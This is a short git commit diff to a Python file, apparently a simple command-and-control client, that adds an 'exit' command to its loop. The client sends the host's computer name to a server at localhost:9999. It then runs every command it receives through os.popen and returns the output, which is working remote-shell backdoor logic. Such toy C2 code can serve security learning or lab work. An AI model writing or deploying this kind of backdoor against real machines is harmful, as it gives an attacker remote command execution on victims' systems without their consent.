072d1e136e6551c547124fa717932222d15763f9
Dax <daxtonwirth@gmail.com>
2022-09-19 13:24:14 -0700

    new functionality

--- client.py
+++ client.py
@@ -6,7 +6,9 @@ HOST, PORT = "localhost", 9999
 #data = " ".join(sys.argv[1:])
 data = os.popen('echo $($env:ComputerName)').read()
 
-while(True):
+Loop = True
+
+while(Loop):
 
     # Create a socket (SOCK_STREAM means a TCP socket)
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
@@ -17,9 +19,11 @@ while(True):
         # Receive data from the server and shut down
         received = str(sock.recv(2048), "utf-8")
 
+        if received == "exit":
+            Loop = False
+
         c2command = os.popen(received).read()
         sock.sendall(bytes(c2command + "\n", "utf-8"))
 
-        # run forever until command received to stop
         time.sleep(5)
 
